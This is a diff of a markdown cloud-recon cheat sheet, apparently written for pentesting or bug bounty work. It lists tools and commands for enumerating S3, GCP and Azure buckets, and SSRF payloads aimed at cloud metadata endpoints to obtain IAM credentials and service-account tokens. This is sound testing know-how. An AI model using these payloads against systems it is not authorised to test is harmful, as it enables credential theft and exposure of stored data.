@@ -1,39 +1,76 @@
 # Cloud Asset Discovery
 
-## AWS Recon
-S3 Bucket Discovery:
-```
-Buckets follow patterns: target-assets, target-backup, target-data, target-logs
-```
-Tools: s3scanner, cloud_enum, mass3
+## AWS Asset Discovery
 
-### Firebase Recon (Critical)
+### S3 Bucket Enumeration
 ```bash
-curl -s https://project.firebaseio.com/.json
-curl -s https://project.firebaseio.com/users.json
+# Permutation-based discovery
+s3scanner -b targets.txt  # targets.txt = list of potential bucket names
+# Service-specific patterns
+# target-backup, target-logs, target-assets, target-config, target-data
+# Permutation engine
+lazys3 target.com
 ```
-Look for Firebase config in JS: apiKey, authDomain, databaseURL
 
-## GCP Recon
-- App Engine: *.appspot.com
-- Cloud Functions: *.cloudfunctions.net
-- Cloud Run: *.run.app
-
-## Azure Recon
-- Blob: *.blob.core.windows.net
-- File: *.file.core.windows.net
-
-## Multi-Cloud Enumeration
+### Load Balancers & CloudFront
 ```bash
-cloud_enum -k target -k target-dev -k target-prod
+# Identify CloudFront distributions
+dig target.com +short CNAME | grep cloudfront
+# Test for direct ALB access via DNS
+# Look for internal ALB DNS names in JS or configs
 ```
 
-## Next Steps
-1. Check bucket/file permissions (public read/write)
-2. Inspect exposed file contents
-3. Look for credentials and PII
-4. Check for write access
+### AWS Metadata Endpoint Testing (via SSRF)
+```bash
+# IMDSv1 (older, no token required)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+# IMDSv2 requires token
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
+```
 
----
+## GCP Discovery
 
-> **Next**: [Automation & One-liners](07-automation-and-oneliners.md)
+### Cloud Storage Buckets
+```bash
+# Same pattern as S3
+curl -s https://storage.googleapis.com/target-bucket/
+curl -s https://target-bucket.storage.googleapis.com/
+# Use GCPBucketBrute
+python3 gcpbucketbrute.py -k target
+```
+
+### GCP Metadata SSRF
+```bash
+# GCP metadata endpoint
+http://metadata.google.internal/computeMetadata/v1/
+# Requires Metadata-Flavor header
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+```
+
+## Azure Discovery
+
+### Blob Storage
+```bash
+# Azure storage enumeration
+curl -s https://targetstorage.blob.core.windows.net/
+# Use Invoke-EnumerateAzureBlobs or MicroBurst
+```
+
+### Azure Metadata SSRF
+```bash
+# Azure IMDS
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Requires Metadata: true header
+```
+
+## Multi-Cloud Enumeration Tools
+
+```bash
+# Cloud enum
+# S3Scanner, GCPBucketBrute, MicroBurst
+# Cloudfox for cloud role enumeration
+cloudfox aws -p target-permissions
+```
